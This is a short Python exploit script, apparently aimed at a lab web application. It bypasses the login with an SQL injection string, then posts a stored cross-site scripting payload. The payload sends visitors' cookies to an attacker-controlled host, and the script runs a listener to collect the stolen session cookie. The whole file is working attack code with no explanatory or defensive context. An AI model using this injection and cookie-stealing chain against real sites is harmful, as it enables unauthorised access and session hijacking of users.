import urllib3
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

url = 'http://192.168.1.135'

# session.cookies.set("MoodleSession", "4cff8a69eb2824aebd478b9745ba6955")

print("[+] Logging as admin")

loginURL = url + '/login.php'

loginData = {
    'usermail':"test@gmail.com' OR 1=1-- ",
    'password':'test'
}

session.post(loginURL, verify=False, proxies=proxies, data=loginData)

triggerXSSURL = url + '/blog.php?author=1'

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global xss
        # xss = self.path
        xss = self.path[19:-11]
        print("Cookie Found:", xss)

sendPostURL = url + '/postblog.php'

content = {'title':'Cookie Stealer',
           'content':'<script>var i=new Image;i.src="http://192.168.1.125/xss.php?"+document.cookie;</script>'}

session.post(sendPostURL, verify=False, proxies=proxies, data=content)

httpd = HTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
httpd.handle_request()

